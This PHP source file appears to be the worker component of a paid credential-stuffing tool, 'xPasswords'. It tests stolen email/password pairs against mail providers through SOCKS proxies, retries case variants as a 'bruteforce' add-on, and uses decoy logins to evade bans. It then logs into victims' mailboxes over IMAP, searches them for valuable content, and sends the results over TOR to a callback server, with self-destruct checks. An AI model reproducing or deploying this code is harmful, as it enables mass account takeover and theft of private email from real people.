<?php
namespace xPasswords;

// Load dependencies
require('../Class/Core.php');

// Child detection
if(!XPASSWORDS_IS_CHILDREN) {
    Core::selfSuicide(); // Bye bye !
}

class Child extends \xPasswords\Child\Base {

    public static function sendCredentials() {

        // Check if the signature is valid
        if(static::$inboundDatas['encryptionKey'] !== XPASSWORDS_CHILD_ENCRYPTION_KEY) {
            Core::selfSuicide();
        }

        // Login to database
        static::databaseConnect(XPASSWORDS_FILENAME_SERVER);

        // Check for pushback results
        $stmt = Bootstrap::$Database->prepare('SELECT id, sDatas FROM xPasswordsQueueOut WHERE isBusy=0 ORDER BY id ASC LIMIT :maxResultsPerQuery');
        $stmt->execute([
            'maxResultsPerQuery' => XPASSWORDS_IO_CALLBACK_MAXRESULTSPERQUERY,
        ]);
        $xQuery = $stmt->fetchAll(\PDO::FETCH_ASSOC);
        if(!$xQuery) {
            return false;
        }

        // Set all of them busy
        Bootstrap::$Database->beginTransaction();
        foreach($xQuery as $xEntry) {
            $stmt = Bootstrap::$Database->prepare('UPDATE xPasswordsQueueOut SET isBusy=1 WHERE id=:entryId');
            $stmt->execute([
                'entryId' => $xEntry['id'],
            ]);
        }
        Bootstrap::$Database->commit();

        // Send results over TOR
        if(!Request::make(XPASSWORDS_IO_CALLBACK_RACINE_URL, [
            'cmd' => 'pushBack',
            'datas' => $xQuery,
        ])) {
            
            // Say the problem here
            echo Core::say('[ERROR] A problem occured while sending back datas to the server. Reporting push back to later.', ['color' => 'red']);
            // echo Core::say('[ERROR] Details: ' . print_r(Request::$lastError, true), ['color' => 'red']);

            // Make locked entries available
            Bootstrap::$Database->beginTransaction();
            foreach($xQuery as $xEntry) {
                $stmt = Bootstrap::$Database->prepare('UPDATE xPasswordsQueueOut SET isBusy=0 WHERE id=:entryId');
                $stmt->execute([
                    'entryId' => $xEntry['id'],
                ]);
            }
            Bootstrap::$Database->commit();
            return false;
        }

        // Remove entries when credentials has been sent back
        Bootstrap::$Database->beginTransaction();
        foreach($xQuery as $xEntry) {
            $stmt = Bootstrap::$Database->prepare('DELETE FROM xPasswordsQueueOut WHERE id=:entryId');
            $stmt->execute([
                'entryId' => $xEntry['id'],
            ]);
        }
        Bootstrap::$Database->commit();

        echo Core::say('[SUCCESS] All entries has been sent !', ['color' => 'green']);
        return true;
    }

    public static function processCredentials() {
        
        // Set authentication
        $authentication = static::$inboundDatas['authentication'];
        
        // Include provider file
        require(Core::$authenticationProvidersDirectory . $authentication['provider'] . '.php');
        
        // Set proxy parameters
        Core::$SocksServers = static::$inboundDatas['base']['proxy'];
        
        // Set cronTask parameters
        Core::$authenticationProviders = static::$inboundDatas['base']['cronTask'];

        $authenticateProviderClass = Core::$authenticationProvidersNamespace . $authentication['provider'];
        if(!$authenticateProviderClass::authenticate($authentication['fullEmail'], $authentication['password'])) {

            // Invalid login detected
            echo Core::say('[FAILURE] Authentication failed for ' . $authentication['fullEmail'] . ':' . $authentication['password'], ['color' => 'red']);

            // Detect if the password contain only digits
            if(ctype_digit((string) $authentication['password'])) {
                if(defined('_DEBUG_MODE')) echo Core::say('[ERROR] Password contain only digits, no bruteforce needed.', ['color' => 'red']);
                static::returnResponse($authentication);
                return true;
            }

            // ToDo: Find an better way to identify bruteforce
            if(isset($authentication['sAdvancedOptions'][0]) AND
               $authentication['sAdvancedOptions'][0] == 1) {
                
                echo Core::say('[INFO] Authentication invalid but now trying with different combinaisons.', ['color' => 'red']);

                // PLUGIN BRUTEFORCE: Try with others combinaisons
                // No surprises, it don't work with digits-only
                // For example, the password is: lOl86
                // This function will test: lol86 (ONLY if the string given is different)
                // This function will test: LOL86 (ONLY if the string given is different)
                // This function will test: Lol86 (ONLY if the string given is different)
                $matchResult = Bootstrap::tryAgain([
                    //'text' => '[ERROR] Testing another password combinaisons...',
                    'nbrOfTimes' => 3,
                    'sleep' => rand(3, 5), // Sleep between 3-5 seconds between retrying
                    'silent' => true, // Silent Core::say in tryAgain function
                    
                ], function($counter) use ($authentication, $authenticateProviderClass) {

                    // Here the logic about request
                    switch($counter) {

                        case 0: // Lowercase
                        $isLowercase = function($str) {
                            return (mb_strtolower($str, 'UTF-8') === $str);
                        };
                        if($isLowercase($authentication['password'])) {
                            if(defined('_DEBUG_MODE')) echo Core::say('[INFO] Useless verification for lowercase, the password is already.', ['color' => 'red']);
                            return false;
                        }
                        echo Core::say('[INFO] Trying with lowercase.', ['color' => 'blue']);
                        $password = strtolower($authentication['password']);
                        break;

                        case 1: // Uppercase
                        $isUppercase = function($str) {
                            return (mb_strtoupper($str, 'UTF-8') === $str);
                        };
                        if($isUppercase($authentication['password'])) {
                            if(defined('_DEBUG_MODE')) echo Core::say('[INFO] Useless verification for uppercase, the password is already.', ['color' => 'red']);
                            return false;
                        }
                        echo Core::say('[INFO] Trying with uppercase.', ['color' => 'blue']);
                        $password = strtoupper($authentication['password']);
                        break;

                        case 2: // Uppercase first character
                        $isStartingWithUpper = function($str) {
                            $chr = mb_substr($str, 0, 1, 'UTF-8');

                            // Prevent digits to return false
                            if(is_numeric($chr)) return true;

                            return mb_strtolower($chr, 'UTF-8') !== $chr;
                        };
                        if($isStartingWithUpper($authentication['password'])) {
                            if(defined('_DEBUG_MODE')) echo Core::say('[INFO] Useless verification for the first character in uppercase, the password is already.', ['color' => 'red']);
                            return false;
                        }
                        echo Core::say('[INFO] Trying with uppercase first.', ['color' => 'blue']);
                        $password = ucfirst(strtolower($authentication['password']));
                        break;
                    }

                    // Test login with custom password
                    if($authenticateProviderClass::authenticate($authentication['fullEmail'], $password)) {
                        //$authentication['password'] = $password; // Successfull login
                        return $password;
                    }

                    return false;
                }, function() { // onError
                    return false;
                });

            } else {

                // The user do not paid for bruteforce
                $matchResult = false;
            }

            // Final checks
            if($matchResult === false) {

                // Set error to false
                $authentication['wasAuthenticated'] = false;
                static::returnResponse($authentication);

                // Cron task with random numbers
                // Help to prevent possible ban
                if(rand(1, 4) == 1) { // 25% of chance

                    echo Core::say('[CRONTASK] [INFO] Launch cron task for ' . $authentication['provider'] . ' to prevent possible ban...', ['color' => 'blue']);

                    if(!isset(Core::$authenticationProviders) OR
                        empty(Core::$authenticationProviders['email']) OR
                        empty(Core::$authenticationProviders['password'])) {
                        
                        echo Core::say('[CRONTASK] [INFO] No credentials available for ' . $authentication['provider'] . ', aborting.', ['color' => 'blue']);
                        return true;
                    }

                    if($authenticateProviderClass::authenticate(Core::$authenticationProviders['email'], Core::$authenticationProviders['password'])) {
                        echo Core::say('[CRONTASK] [INFO] Cron task completed.', ['color' => 'blue']);
                    } else {
                        echo Core::say('[CRONTASK] [ERROR] Unable to perform cron task about ' . $authentication['provider'], ['color' => 'red']);
                    }
                }

                // Bye
                return true;
            }

            // Erase password
            $authentication['wasBruteforced'] = true;
            $authentication['password'] = $matchResult;
        }

        // Looks like the password is okay !
        $authentication['wasAuthenticated'] = true;

        if(isset($authentication['sFor']) AND !empty($authentication['sFor'])) {

            // Gossip
            echo Core::say('[INFO] Success ! Login to the mailbox...', ['color' => 'blue']);

            // Login to the IMAP to search interesting content
            $finalResult = static::search($authentication['fullEmail'], $authentication['password'], [
                'IMAPHostname' => $authenticateProviderClass::$imapAddress,
                'IMAPLookFor' => $authentication['sFor'],
                'SOCKSProxy' => Core::getProxy(),
            ]);

            if(!$finalResult['wasAuthenticated']) {
                // Problem with IMAP
                echo Core::say('[ERROR] Unable to connect to IMAP after valid login via HTTP(S)', ['color' => 'red']);
                static::returnResponse($authentication);
                return true;
            }

            // Everything seems okay, return to server
            $authentication['juicyInformations'] = $finalResult['juicyInformations'];

        } else {

            // As the user do not ordered any research in mailboxes, just set an empty array
            $authentication['juicyInformations'] = [];
        }

        static::returnResponse($authentication);
        return true;
    }

    private static function search($email, $password, $options=false) {

        // Options (IMAP server, SOCKS 5 server, 
        if(!$options) {
            return false;
        }

        // Declare $juicyInformations as array
        $juicyInformations = [];

        // Open IMAP connection
        $IMAPConnection = new \cIMAP([
            'hostname' => $options['IMAPHostname'],
            'username' => $email,
            'password' => $password,
            'proxy' => $options['SOCKSProxy'],
        ]);

        $IMAPlastErr = $IMAPConnection->getLastErr();
        if(!empty($IMAPlastErr)) {

            echo Core::say('[ERROR] [PROVIDER] Unable to connect to provider, aborting.', ['color' => 'red']);

            switch($IMAPConnection->getLastErr()['error']) {
                case 'AUTH_FAILED':
                echo Core::say('[ERROR] [PROVIDER] Unable to list folders. Login failure.', ['color' => 'red']);
                break;

                case 'UNKNOWN':
                echo Core::say('[ERROR] [PROVIDER] Unable to list folders. Unknown error happened.', ['color' => 'red']);
                echo Core::say('[ERROR] [PROVIDER] Details: ' . $IMAPConnection->getLastErr()['details'], ['color' => 'red']);
                break;
            }

            $IMAPConnection->disconnect();
            $IMAPConnection = NULL;
            return ['wasAuthenticated' => false];
        }

        // GET CAPABILITY: var_dump($IMAPConnection->getCapability()); $IMAPConnection->disconnect(); exit;

        // Benchmark (debug mode)
        if(defined('_DEBUG_MODE')) {
            $countAllBenchmark = 0;
            $countOptimizedBenchmark = 0;
        }

        // Lists folders and scan
        $listFoldersVar = $IMAPConnection->listFolders();

        // 60 seconds per folder for verification plus 600 seconds - the difference from the launch
        static::returnResponse(((count($listFoldersVar) * 60) + (time() - TIME_RUN)), 'setOptimizedTimeout');

        foreach($listFoldersVar as $fId => $fName) {

            $selectedFolder = $IMAPConnection->selectFolder($fName, true);
            if(!$selectedFolder) {
                if(defined('_DEBUG_MODE')) echo Core::say('[WARNING] [PROVIDER] Folder is empty, aborting this one.', ['color' => 'yellow']);
                continue;
            }

            // Numbers of email and current folder
            echo Core::say('[INFO] [PROVIDER] Looking in "' . $fName . '" folder', ['color' => 'blue']);
            echo Core::say('[INFO] [PROVIDER] Number of mails: ' . $selectedFolder, ['color' => 'blue']);

            // Get list of all queries
            $searchQueriesAll = Constants::$searchQueries;

            // Detect what we have to search
            $searchQueries = []; // Ready to push
            foreach($options['IMAPLookFor'] as $xCode) {
                $searchQueries[$xCode] = Constants::$searchQueries[$xCode];
            }

            // Detect sent folder
            switch($fName) {
                // Change all FROM to TO using an hacks with JSON
                case 'Messages envoy&AOk-s': // Most of inboxes
                case 'Sent': // Most of inboxes
                case '[Gmail]/Messages envoy&AOk-s': // FR Gmail
                case '[Gmail]/Sent': // US Gmail
                echo Core::say('[INFO] [PROVIDER] Reversing e-mails direction', ['color' => 'blue']);
                $searchQueries = Core::encode($searchQueries);
                $searchQueries = str_replace('FROM \"', 'TO \"', $searchQueries);
                $searchQueries = Core::decode($searchQueries);
                break;
            }

            // Shuffle order of sections queries for more security and obscurity
            Core::shuffleAssoc($searchQueries);

            // Function to transform queries in IMAP-compatible string
            $IMAPRender = function($xQueries) {

                if(count($xQueries) > 1) {

                    // Shuffle order of inside sections inside sections (values) queries for more security and obscurity
                    Core::shuffleAssoc($xQueries);

                    // Multiple criterias support
                    $xQuery = str_repeat('OR ', (count($xQueries) - 1));
                    $xQuery .= '(' . implode(') (', $xQueries) . ')';
                    //$xQuery .= str_repeat(')', count($xQueries));

                    return $xQuery;
                }

                return $xQueries[0];
            };

            // Enter in the first pass
            foreach($searchQueries as $service => $xQueries) {

                // Shuffle order of inside sections queries for more security and obscurity
                Core::shuffleAssoc($xQueries);

                // Check the whole list
                $xBigQuery = [];
                foreach(array_values($xQueries) as $Number => $xQuery) {
                    $xBigQuery = array_merge($xBigQuery, $xQuery);
                }
                $xQuery = $IMAPRender($xBigQuery);
                $imapSearch = $IMAPConnection->search($xQuery);

                // Benchmark
                if(defined('_DEBUG_MODE')) {
                    $countAllBenchmark = $countAllBenchmark + count($xBigQuery);
                    $countOptimizedBenchmark = $countOptimizedBenchmark + 1;
                }

                // If nothing is found, don't test one by one
                if(empty($imapSearch)) {
                    //if(defined('_DEBUG_MODE')) echo Core::say('[INFO] [DEBUG] [PROVIDER] Nothing found for this query: ' . $xQuery, ['color' => 'blue']);
                    continue;   
                }

                if(defined('_DEBUG_MODE')) echo Core::say('[INFO] [DEBUG] [PROVIDER] Found something in a big query ! Now checking which is the good one...', ['color' => 'blue']);

                // Search in the current folder
                foreach($xQueries as $serviceDeep => $xQueriesDeep) {

                    // Useless verification if service has been already found
                    if(isset($juicyInformations[ (string) $service ][ (string) $serviceDeep ])) {
                        echo Core::say('[INFO] [PROVIDER] A query has been skipped because it was already in found informations.', ['color' => 'yellow']);
                        continue;
                    }
                    
                    // Benchmark
                    if(defined('_DEBUG_MODE')) {
                        $countAllBenchmark = ($countAllBenchmark + count($xQueriesDeep));
                        $countOptimizedBenchmark = ($countOptimizedBenchmark + 1);
                    }

                    // Debug purposes
                    if(defined('_DEBUG_MODE')) echo Core::say('[INFO] [DEBUG] [PROVIDER] ' . $xQueryDeep, ['color' => 'blue']);
                    
                    // Search in the server
                    $xQueryDeep = $IMAPRender($xQueriesDeep);
                    $imapSearchDeep = $IMAPConnection->search($xQueryDeep);

                    // If something is found, add it to juicyInformations
                    if(!empty($imapSearchDeep)) {
                        if(!is_array($juicyInformations[ (string) $service ])) $juicyInformations[ (string) $service ] = [];
                        $juicyInformations[ (string) $service ][] = (string) $serviceDeep;
                        echo Core::say('[SUCCESS] [PROVIDER] Found something about ' . Constants::$searchQueriesName[ $service ][ $serviceDeep ] . ' with query: {' . $xQueryDeep . '}', ['color' => 'green']);
                    }
                }
            }
        }

        if(defined('_DEBUG_MODE')) echo Core::say('[INFO] [DEBUG] [PROVIDER] Number of queries with OptimizeTechnology ' . $countOptimizedBenchmark, ['color' => 'blue']);
        if(defined('_DEBUG_MODE')) echo Core::say('[INFO] [DEBUG] [PROVIDER] Number of queries without OptimizeTechnology ' . $countAllBenchmark, ['color' => 'blue']);

        $IMAPConnection->disconnect();
        $IMAPConnection = NULL;
        return [
            'wasAuthenticated' => true,
            'juicyInformations' => $juicyInformations,
        ];
    }
};

Child::run();